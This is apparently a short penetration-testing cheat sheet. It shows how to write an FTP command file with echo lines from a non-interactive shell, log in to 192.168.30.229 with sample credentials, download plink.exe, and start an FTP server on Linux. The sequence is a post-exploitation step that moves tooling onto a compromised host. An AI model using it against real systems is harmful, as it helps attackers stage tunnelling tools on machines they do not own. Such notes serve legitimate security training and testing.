# Non interactive connection on a FTP server
ftp -v -n -s:ftp.txt

# The following code can be copy/paste in a non interactive shell
echo open 192.168.30.229> ftp.txt
echo USER user>> ftp.txt
echo 12345>> ftp.txt
echo bin>> ftp.txt
echo GET plink.exe>> ftp.txt
echo bye>> ftp.txt

# On a Linux, launch a simple FTP server
ftpserver
